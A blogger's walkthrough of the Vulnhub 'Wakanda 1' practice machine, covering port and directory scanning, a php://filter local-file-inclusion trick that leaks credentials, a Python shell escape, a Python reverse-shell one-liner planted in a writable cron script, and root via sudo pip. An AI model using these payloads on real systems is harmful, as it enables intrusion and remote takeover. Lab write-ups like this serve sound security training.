---
layout: default
title : muzec - Wakanda 1 Writeup
---

![image](https://user-images.githubusercontent.com/69868171/117991276-e3a22a80-b30b-11eb-9574-7f990424e319.png)

Wakanda 1 a crazy little box that kick my ass lol since i decided to complete all the OSCP like box on Vulnhubs so today we are solving Wakanda 1 you can easily grab a copy here [Wakanda Download Here](https://www.vulnhub.com/entry/wakanda-1,251/) .

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/wakanda]
└─$ cat nmap.nmap
# Nmap 7.91 scan initiated Wed May 12 03:28:56 2021 as: nmap -p- -sC -sV -oA nmap 172.16.139.173
Nmap scan report for 172.16.139.173
Host is up (0.00019s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Vibranium Market
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          38725/udp6  status
|   100024  1          51498/tcp   status
|   100024  1          53596/tcp6  status
|_  100024  1          53798/udp   status
3333/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 1c:98:47:56:fc:b8:14:08:8f:93:ca:36:44:7f:ea:7a (DSA)
|   2048 f1:d5:04:78:d3:3a:9b:dc:13:df:0f:5f:7f:fb:f4:26 (RSA)
|   256 d8:34:41:5d:9b:fe:51:bc:c6:4e:02:14:5e:e1:08:c5 (ECDSA)
|_  256 0e:f5:8d:29:3c:73:57:c7:38:08:6d:50:84:b6:6c:27 (ED25519)
51498/tcp open  status  1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May 12 03:29:11 2021 -- 1 IP address (1 host up) scanned in 14.70 seconds
```

Some few ports also SSH is running on port 3333 so let check port 80 first .

![image](https://user-images.githubusercontent.com/69868171/117991276-e3a22a80-b30b-11eb-9574-7f990424e319.png)

Intersting let cehck the source code maybe a hint is left behind to trace .

![image](https://user-images.githubusercontent.com/69868171/117992275-cd489e80-b30c-11eb-9874-43379cc5f691.png)

Some interesting comment in the source so i try checking the parameter but it only change the language to french .

![image](https://user-images.githubusercontent.com/69868171/117992489-fb2de300-b30c-11eb-9f14-3a200f891f49.png)

Let try some directory brute forcing on the target .

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/wakanda]
└─$ gobuster dir -u http://172.16.139.173/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.139.173/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
2021/05/12 07:30:39 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 1527]
/fr.php               (Status: 200) [Size: 0]   
/admin                (Status: 200) [Size: 0]   
/backup               (Status: 200) [Size: 0]   
/shell                (Status: 200) [Size: 0]   
/secret.txt           (Status: 200) [Size: 40]  
/secret               (Status: 200) [Size: 0]   
/troll                (Status: 200) [Size: 0]   
/server-status        (Status: 403) [Size: 302] 
/hahaha               (Status: 200) [Size: 0]   
/hohoho               (Status: 200) [Size: 0]   
                                                
===============================================================
2021/05/12 07:33:35 Finished
===============================================================
```
Some really interesting directory but all is empty only the `secret.txt` which is also a troll lol. 

![image](https://user-images.githubusercontent.com/69868171/117993501-cbcba600-b30d-11eb-830d-4e34665302c2.png)

Ok going back to the language parameter to test for some LFI vulnerability .

![image](https://user-images.githubusercontent.com/69868171/117993812-0df4e780-b30e-11eb-979c-84f9ae88fe12.png)

I actually spend hours here to figure out what am missing so i end up peeping at a write up to see what am missing and guess what am actually at the right path but just need a php wrapper fliter for it to work.

`php://filter/convert.base64-encode/resource=index`

![image](https://user-images.githubusercontent.com/69868171/117994712-bb67fb00-b30e-11eb-8bd8-6714ad32d108.png)

And boom we have the index page source code now let try to decode it.

![image](https://user-images.githubusercontent.com/69868171/117995174-1bf73800-b30f-11eb-9857-8b329936e033.png)

Cool with some credentials since we know the username is `mamadou` now let log in SSH .

```
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs]
└─$ ssh mamadou@172.16.139.173 -p3333
mamadou@172.16.139.173's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Wed May 12 05:14:12 2021 from 172.16.139.1
Python 2.7.9 (default, Jun 29 2016, 13:08:31) 
[GCC 4.9.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 
```

And we are in but restricted in python shell now time to break out of it.

`import os; os.system("/bin/bash")`

![image](https://user-images.githubusercontent.com/69868171/117996303-09c9c980-b310-11eb-8b2a-d1e1ffefe789.png)

And boom and we have the flag1.txt let move on now haahahhahaah .

```
mamadou@Wakanda1:~$ ls
flag1.txt
mamadou@Wakanda1:~$ cd ..
mamadou@Wakanda1:/home$ ls
devops  mamadou
mamadou@Wakanda1:/home$ cd devops
mamadou@Wakanda1:/home/devops$ ls
flag2.txt
mamadou@Wakanda1:/home/devops$ cat flag2.txt
cat: flag2.txt: Permission denied
mamadou@Wakanda1:/home/devops$ 
```
And i was thinking it our lucky day since i have able to get into the `devops` user folder thinking i have access to the flag2.txt but damn no luck time to move our Privilege.

### Privilege Escalation .

Let transfer `linpeas.sh` to our target for quick result .

![image](https://user-images.githubusercontent.com/69868171/117997378-e7847b80-b310-11eb-86b8-b3202d316f25.png)

`/srv/.antivirus.py` look promising and we have write permission on it.

```
mamadou@Wakanda1:/tmp$ ls -la /srv/.antivirus.py
-rw-r--rw- 1 devops developer 252 May 12 06:12 /srv/.antivirus.py
mamadou@Wakanda1:/tmp$ 
```

So i decided to add my our reverse shell code payload to the file .

`import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`

![image](https://user-images.githubusercontent.com/69868171/117998277-bbb5c580-b311-11eb-86ac-db08f3a80a8a.png)

So let start an Ncat listener and wait for shell.

```
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs]
└─$ nc -nvlp 1337
listening on [any] 1337 ...
```

And boom we have shell .

![image](https://user-images.githubusercontent.com/69868171/117998736-2c5ce200-b312-11eb-8d42-110f053fcbdd.png)

Let spawn a TTY shell now .

```
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs]
└─$ nc -nvlp 1337
listening on [any] 1337 ...
connect to [172.20.10.4] from (UNKNOWN) [172.20.10.4] 58567
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn ("/bin/bash")'
devops@Wakanda1:/$ id
id
uid=1001(devops) gid=1002(developer) groups=1002(developer)
devops@Wakanda1:/$ 
```

Now let check `sudo -l` .

```
devops@Wakanda1:/$ sudo -l
sudo -l
Matching Defaults entries for devops on Wakanda1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User devops may run the following commands on Wakanda1:
    (ALL) NOPASSWD: /usr/bin/pip
```

Time to hit gtfobins .

![image](https://user-images.githubusercontent.com/69868171/117999226-a0978580-b312-11eb-92d3-49a3743297b3.png)

1. TF=$(mktemp -d)
2. echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
3. sudo pip install $TF

![image](https://user-images.githubusercontent.com/69868171/117999540-f10ee300-b312-11eb-8a10-c1bfbb02f7b9.png)

And we are root so i foget to get the flag2.txt let get it now also with the root.txt .

![image](https://user-images.githubusercontent.com/69868171/117999717-20255480-b313-11eb-935a-7e147a0fc895.png)

And the root.txt .

![image](https://user-images.githubusercontent.com/69868171/117999773-316e6100-b313-11eb-8a60-2a5b4eccf036.png)

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
